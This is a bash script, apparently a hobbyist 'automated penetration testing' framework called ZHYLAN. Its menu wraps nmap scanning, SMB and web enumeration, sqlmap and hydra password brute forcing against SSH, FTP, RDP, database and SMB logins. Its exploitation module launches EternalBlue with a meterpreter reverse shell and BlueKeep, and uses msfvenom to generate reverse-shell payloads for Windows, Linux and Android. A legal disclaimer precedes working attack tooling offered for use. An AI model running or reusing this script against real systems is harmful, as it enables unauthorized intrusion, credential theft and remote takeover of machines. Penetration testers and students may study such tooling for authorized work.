#!/bin/bash

#############################################
# ZHYLAN - Automated Penetration Testing Tool
# Author: nurlanulyoff
# Version: 1.0.0
# Description: Comprehensive automated pentesting framework
#############################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Global variables
TARGET=""
REPORT_DIR="$HOME/zhylan_reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="$REPORT_DIR/zhylan_report_${TIMESTAMP}.txt"

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ███████╗██╗  ██╗██╗   ██╗██╗      █████╗ ███╗   ██╗
    ╚══███╔╝██║  ██║╚██╗ ██╔╝██║     ██╔══██╗████╗  ██║
      ███╔╝ ███████║ ╚████╔╝ ██║     ███████║██╔██╗ ██║
     ███╔╝  ██╔══██║  ╚██╔╝  ██║     ██╔══██║██║╚██╗██║
    ███████╗██║  ██║   ██║   ███████╗██║  ██║██║ ╚████║
    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}    Automated Penetration Testing Framework${NC}"
    echo -e "${WHITE}    Author: nurlanulyoff | Version: 1.0.0${NC}"
    echo -e "${RED}    ⚠️  FOR AUTHORIZED TESTING ONLY ⚠️${NC}"
    echo ""
}

# Legal disclaimer
show_disclaimer() {
    echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║              ⚠️  LEGAL DISCLAIMER ⚠️                       ║${NC}"
    echo -e "${RED}╠════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║ This tool is for EDUCATIONAL and AUTHORIZED testing only. ║${NC}"
    echo -e "${WHITE}║ Unauthorized access to computer systems is ILLEGAL.       ║${NC}"
    echo -e "${WHITE}║ The author is NOT responsible for misuse of this tool.    ║${NC}"
    echo -e "${WHITE}║ Always obtain written permission before testing.          ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Do you accept these terms? (yes/no): " accept
    if [[ "$accept" != "yes" ]]; then
        echo -e "${RED}[!] Terms not accepted. Exiting...${NC}"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    local deps=("nmap" "hydra" "nikto" "sqlmap" "msfconsole" "dirb" "enum4linux" "smbclient")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
            echo -e "${RED}[!] Missing: $dep${NC}"
        else
            echo -e "${GREEN}[✓] Found: $dep${NC}"
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Missing dependencies: ${missing[*]}${NC}"
        read -p "Install missing dependencies? (yes/no): " install
        if [[ "$install" == "yes" ]]; then
            install_dependencies
        else
            echo -e "${RED}[!] Cannot proceed without dependencies${NC}"
            exit 1
        fi
    fi
}

# Install dependencies
install_dependencies() {
    echo -e "${BLUE}[*] Installing dependencies...${NC}"
    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        sudo apt-get install -y nmap hydra nikto sqlmap metasploit-framework dirb enum4linux smbclient
    elif command -v yum &> /dev/null; then
        sudo yum install -y nmap hydra nikto sqlmap metasploit dirb samba-client
    else
        echo -e "${RED}[!] Package manager not supported. Install manually.${NC}"
        exit 1
    fi
}

# Initialize report
init_report() {
    mkdir -p "$REPORT_DIR"
    echo "ZHYLAN Penetration Testing Report" > "$REPORT_FILE"
    echo "Generated: $(date)" >> "$REPORT_FILE"
    echo "Target: $TARGET" >> "$REPORT_FILE"
    echo "========================================" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
}

# Network reconnaissance
network_recon() {
    echo -e "${BLUE}[*] Starting Network Reconnaissance...${NC}"
    echo "=== NETWORK RECONNAISSANCE ===" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] Host discovery...${NC}"
    nmap -sn "$TARGET" -oN "$REPORT_DIR/host_discovery_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/host_discovery_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] OS detection...${NC}"
    sudo nmap -O "$TARGET" -oN "$REPORT_DIR/os_detection_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/os_detection_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${GREEN}[✓] Network reconnaissance complete${NC}"
}

# Port scanning
port_scan() {
    echo -e "${BLUE}[*] Starting Port Scanning...${NC}"
    echo "=== PORT SCANNING ===" >> "$REPORT_FILE"
    
    echo -e "${CYAN}Select scan type:${NC}"
    echo "1) Quick scan (top 1000 ports)"
    echo "2) Full scan (all 65535 ports)"
    echo "3) Stealth scan (SYN)"
    echo "4) Aggressive scan"
    echo "5) UDP scan"
    read -p "Choice: " scan_choice
    
    case $scan_choice in
        1)
            echo -e "${YELLOW}[*] Quick scan...${NC}"
            nmap -T4 -F "$TARGET" -oN "$REPORT_DIR/quick_scan_${TIMESTAMP}.txt"
            ;;
        2)
            echo -e "${YELLOW}[*] Full scan (this may take a while)...${NC}"
            nmap -p- "$TARGET" -oN "$REPORT_DIR/full_scan_${TIMESTAMP}.txt"
            ;;
        3)
            echo -e "${YELLOW}[*] Stealth scan...${NC}"
            sudo nmap -sS "$TARGET" -oN "$REPORT_DIR/stealth_scan_${TIMESTAMP}.txt"
            ;;
        4)
            echo -e "${YELLOW}[*] Aggressive scan...${NC}"
            sudo nmap -A -T4 "$TARGET" -oN "$REPORT_DIR/aggressive_scan_${TIMESTAMP}.txt"
            ;;
        5)
            echo -e "${YELLOW}[*] UDP scan...${NC}"
            sudo nmap -sU "$TARGET" -oN "$REPORT_DIR/udp_scan_${TIMESTAMP}.txt"
            ;;
    esac
    
    cat "$REPORT_DIR"/*scan_${TIMESTAMP}.txt >> "$REPORT_FILE"
    echo -e "${GREEN}[✓] Port scanning complete${NC}"
}

# Service enumeration
service_enum() {
    echo -e "${BLUE}[*] Starting Service Enumeration...${NC}"
    echo "=== SERVICE ENUMERATION ===" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] Service version detection...${NC}"
    nmap -sV "$TARGET" -oN "$REPORT_DIR/service_version_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/service_version_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] NSE scripts...${NC}"
    nmap --script=default "$TARGET" -oN "$REPORT_DIR/nse_default_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/nse_default_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] SMB enumeration...${NC}"
    enum4linux -a "$TARGET" > "$REPORT_DIR/smb_enum_${TIMESTAMP}.txt" 2>&1
    cat "$REPORT_DIR/smb_enum_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${GREEN}[✓] Service enumeration complete${NC}"
}

# Vulnerability scanning
vuln_scan() {
    echo -e "${BLUE}[*] Starting Vulnerability Scanning...${NC}"
    echo "=== VULNERABILITY SCANNING ===" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] Nmap vulnerability scripts...${NC}"
    nmap --script=vuln "$TARGET" -oN "$REPORT_DIR/vuln_scan_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/vuln_scan_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] SMB vulnerabilities...${NC}"
    nmap --script=smb-vuln* "$TARGET" -oN "$REPORT_DIR/smb_vuln_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/smb_vuln_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${GREEN}[✓] Vulnerability scanning complete${NC}"
}

# Web application testing
web_test() {
    echo -e "${BLUE}[*] Starting Web Application Testing...${NC}"
    echo "=== WEB APPLICATION TESTING ===" >> "$REPORT_FILE"
    
    read -p "Enter web URL (e.g., http://target.com): " web_url
    
    echo -e "${YELLOW}[*] Nikto scan...${NC}"
    nikto -h "$web_url" -o "$REPORT_DIR/nikto_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/nikto_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${YELLOW}[*] Directory brute force...${NC}"
    dirb "$web_url" -o "$REPORT_DIR/dirb_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/dirb_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    read -p "Test for SQL injection? (yes/no): " sql_test
    if [[ "$sql_test" == "yes" ]]; then
        echo -e "${YELLOW}[*] SQL injection testing...${NC}"
        sqlmap -u "$web_url" --batch --crawl=2 --output-dir="$REPORT_DIR/sqlmap_${TIMESTAMP}"
    fi
    
    echo -e "${GREEN}[✓] Web testing complete${NC}"
}

# Brute force attacks
brute_force() {
    echo -e "${BLUE}[*] Starting Brute Force Module...${NC}"
    echo "=== BRUTE FORCE ATTACKS ===" >> "$REPORT_FILE"
    
    echo -e "${CYAN}Select service:${NC}"
    echo "1) SSH (port 22)"
    echo "2) FTP (port 21)"
    echo "3) RDP (port 3389)"
    echo "4) MySQL (port 3306)"
    echo "5) PostgreSQL (port 5432)"
    echo "6) SMB (port 445)"
    echo "7) Custom"
    read -p "Choice: " service_choice
    
    read -p "Enter username (or path to username list): " username
    read -p "Enter password list path: " passlist
    
    case $service_choice in
        1)
            echo -e "${YELLOW}[*] SSH brute force...${NC}"
            hydra -l "$username" -P "$passlist" ssh://"$TARGET" -o "$REPORT_DIR/hydra_ssh_${TIMESTAMP}.txt"
            ;;
        2)
            echo -e "${YELLOW}[*] FTP brute force...${NC}"
            hydra -l "$username" -P "$passlist" ftp://"$TARGET" -o "$REPORT_DIR/hydra_ftp_${TIMESTAMP}.txt"
            ;;
        3)
            echo -e "${YELLOW}[*] RDP brute force...${NC}"
            hydra -l "$username" -P "$passlist" rdp://"$TARGET" -o "$REPORT_DIR/hydra_rdp_${TIMESTAMP}.txt"
            ;;
        4)
            echo -e "${YELLOW}[*] MySQL brute force...${NC}"
            hydra -l "$username" -P "$passlist" mysql://"$TARGET" -o "$REPORT_DIR/hydra_mysql_${TIMESTAMP}.txt"
            ;;
        5)
            echo -e "${YELLOW}[*] PostgreSQL brute force...${NC}"
            hydra -l "$username" -P "$passlist" postgres://"$TARGET" -o "$REPORT_DIR/hydra_postgres_${TIMESTAMP}.txt"
            ;;
        6)
            echo -e "${YELLOW}[*] SMB brute force...${NC}"
            hydra -l "$username" -P "$passlist" smb://"$TARGET" -o "$REPORT_DIR/hydra_smb_${TIMESTAMP}.txt"
            ;;
        7)
            read -p "Enter service (e.g., http-post-form): " custom_service
            hydra -l "$username" -P "$passlist" "$custom_service"://"$TARGET" -o "$REPORT_DIR/hydra_custom_${TIMESTAMP}.txt"
            ;;
    esac
    
    cat "$REPORT_DIR"/hydra_*_${TIMESTAMP}.txt >> "$REPORT_FILE" 2>/dev/null
    echo -e "${GREEN}[✓] Brute force complete${NC}"
}

# Exploitation module
exploitation() {
    echo -e "${BLUE}[*] Starting Exploitation Module...${NC}"
    echo "=== EXPLOITATION ===" >> "$REPORT_FILE"
    
    echo -e "${CYAN}Select exploit:${NC}"
    echo "1) EternalBlue (MS17-010)"
    echo "2) BlueKeep (CVE-2019-0708)"
    echo "3) Generate payload"
    echo "4) Custom Metasploit module"
    read -p "Choice: " exploit_choice
    
    case $exploit_choice in
        1)
            echo -e "${YELLOW}[*] Launching EternalBlue exploit...${NC}"
            msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $(hostname -I | awk '{print $1}'); exploit; exit" | tee "$REPORT_DIR/eternalblue_${TIMESTAMP}.txt"
            ;;
        2)
            echo -e "${YELLOW}[*] Launching BlueKeep exploit...${NC}"
            msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS $TARGET; exploit; exit" | tee "$REPORT_DIR/bluekeep_${TIMESTAMP}.txt"
            ;;
        3)
            echo -e "${YELLOW}[*] Generating payload...${NC}"
            read -p "Payload type (windows/linux/android): " payload_os
            read -p "Format (exe/elf/apk): " payload_format
            msfvenom -p "$payload_os"/meterpreter/reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=4444 -f "$payload_format" -o "$REPORT_DIR/payload_${TIMESTAMP}.$payload_format"
            echo -e "${GREEN}[✓] Payload saved to $REPORT_DIR/payload_${TIMESTAMP}.$payload_format${NC}"
            ;;
        4)
            echo -e "${YELLOW}[*] Launching Metasploit console...${NC}"
            msfconsole
            ;;
    esac
    
    echo -e "${GREEN}[✓] Exploitation module complete${NC}"
}

# Full automated scan
full_auto_scan() {
    echo -e "${BLUE}[*] Starting Full Automated Scan...${NC}"
    
    init_report
    network_recon
    sleep 2
    
    echo -e "${YELLOW}[*] Running comprehensive port scan...${NC}"
    nmap -A -T4 -p- "$TARGET" -oN "$REPORT_DIR/full_auto_scan_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/full_auto_scan_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    service_enum
    sleep 2
    vuln_scan
    sleep 2
    
    echo -e "${YELLOW}[*] Checking for common vulnerabilities...${NC}"
    nmap --script=vuln,exploit "$TARGET" -oN "$REPORT_DIR/auto_vuln_${TIMESTAMP}.txt"
    cat "$REPORT_DIR/auto_vuln_${TIMESTAMP}.txt" >> "$REPORT_FILE"
    
    echo -e "${GREEN}[✓] Full automated scan complete${NC}"
    echo -e "${CYAN}[*] Report saved to: $REPORT_FILE${NC}"
}

# Generate report
generate_report() {
    echo -e "${BLUE}[*] Generating comprehensive report...${NC}"
    
    local summary_file="$REPORT_DIR/summary_${TIMESTAMP}.txt"
    
    echo "ZHYLAN PENETRATION TEST SUMMARY" > "$summary_file"
    echo "================================" >> "$summary_file"
    echo "Date: $(date)" >> "$summary_file"
    echo "Target: $TARGET" >> "$summary_file"
    echo "" >> "$summary_file"
    
    echo "Open Ports:" >> "$summary_file"
    grep -E "open|filtered" "$REPORT_DIR"/*scan*.txt 2>/dev/null | head -20 >> "$summary_file"
    echo "" >> "$summary_file"
    
    echo "Detected Services:" >> "$summary_file"
    grep -E "Service Info|Running" "$REPORT_DIR"/*scan*.txt 2>/dev/null | head -10 >> "$summary_file"
    echo "" >> "$summary_file"
    
    echo "Vulnerabilities Found:" >> "$summary_file"
    grep -iE "vulnerable|exploit|critical|high" "$REPORT_DIR"/*vuln*.txt 2>/dev/null | head -15 >> "$summary_file"
    echo "" >> "$summary_file"
    
    echo "Files generated:" >> "$summary_file"
    ls -lh "$REPORT_DIR"/*${TIMESTAMP}* >> "$summary_file"
    
    cat "$summary_file"
    echo -e "${GREEN}[✓] Report generated: $summary_file${NC}"
}

# Main menu
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           MAIN MENU                    ║${NC}"
        echo -e "${CYAN}╠════════════════════════════════════════╣${NC}"
        echo -e "${WHITE}║ 1) Network Reconnaissance              ║${NC}"
        echo -e "${WHITE}║ 2) Port Scanning                       ║${NC}"
        echo -e "${WHITE}║ 3) Service Enumeration                 ║${NC}"
        echo -e "${WHITE}║ 4) Vulnerability Scanning              ║${NC}"
        echo -e "${WHITE}║ 5) Web Application Testing             ║${NC}"
        echo -e "${WHITE}║ 6) Brute Force Attacks                 ║${NC}"
        echo -e "${WHITE}║ 7) Exploitation Module                 ║${NC}"
        echo -e "${WHITE}║ 8) Full Automated Scan                 ║${NC}"
        echo -e "${WHITE}║ 9) Generate Report                     ║${NC}"
        echo -e "${WHITE}║ 0) Exit                                ║${NC}"
        echo -e "${CYAN}╚════════════════════════════════════════╝${NC}"
        echo ""
        read -p "Select option: " choice
        
        case $choice in
            1) network_recon ;;
            2) port_scan ;;
            3) service_enum ;;
            4) vuln_scan ;;
            5) web_test ;;
            6) brute_force ;;
            7) exploitation ;;
            8) full_auto_scan ;;
            9) generate_report ;;
            0) 
                echo -e "${GREEN}[*] Exiting ZHYLAN. Stay ethical!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
        
        read -p "Press Enter to continue..."
    done
}

# Main execution
main() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${YELLOW}[!] Some features require root privileges${NC}"
        echo -e "${YELLOW}[!] Consider running with sudo for full functionality${NC}"
    fi
    
    show_banner
    show_disclaimer
    check_dependencies
    
    read -p "Enter target IP or domain: " TARGET
    
    if [[ -z "$TARGET" ]]; then
        echo -e "${RED}[!] Target cannot be empty${NC}"
        exit 1
    fi
    
    init_report
    main_menu
}

# Run main function
main
